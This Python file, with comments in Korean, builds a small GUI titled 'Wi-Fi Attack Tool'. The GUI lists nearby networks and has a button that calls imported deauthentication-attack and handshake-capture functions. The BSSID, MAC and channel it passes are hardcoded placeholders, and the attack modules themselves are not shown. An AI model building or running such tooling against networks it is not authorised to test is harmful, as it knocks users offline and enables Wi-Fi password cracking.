import customtkinter as ctk
from core.scan_wifi import get_wifi_list  # scan_wifi.py에서 함수 불러오기
from core.deauth_attack import deauth_attack  # deauth_attack.py에서 함수 불러오기
from core.handshake_capture import start_capture  # handshake_capture.py에서 함수 불러오기

def launch_gui():
    ctk.set_appearance_mode("light")
    ctk.set_default_color_theme("blue")

    root = ctk.CTk()
    root.title("Wi-Fi Attack Tool")
    root.geometry("400x400")

    wifi_list = get_wifi_list()  # scan_wifi.py에서 Wi-Fi 목록 가져오기
    wifi_dropdown = ctk.CTkComboBox(root, values=wifi_list)
    wifi_dropdown.set("Wi-Fi 선택")
    wifi_dropdown.pack(pady=20)

    result_label = ctk.CTkLabel(root, text="")
    result_label.pack(pady=10)

    def on_attack_button_click():
        selected_wifi = wifi_dropdown.get()
        result_label.configure(text=f"{selected_wifi} 대상 공격 준비 중... (다음 단계 연결 예정)")

        # 여기서 실제 공격 시작
        # 1. 선택된 Wi-Fi 정보를 기반으로 deauth 공격 실행
        # (예시: 실제로는 AP BSSID와 채널 정보를 전달해야 함)
        ap_bssid = "00:11:22:33:44:55"  # 예시 AP BSSID
        client_mac = "AA:BB:CC:DD:EE:FF"  # 예시 클라이언트 MAC
        channel = 6  # 예시 채널

        # Deauth 공격 실행
        deauth_attack(ap_bssid, client_mac, channel)

        # 2. Handshake 캡처 시작
        start_capture(ap_bssid, channel)

        # 상태 업데이트
        result_label.configure(text=f"{selected_wifi} 공격 시작됨...")

    attack_button = ctk.CTkButton(root, text="공격 시작", command=on_attack_button_click)
    attack_button.pack(pady=10)

    root.mainloop()
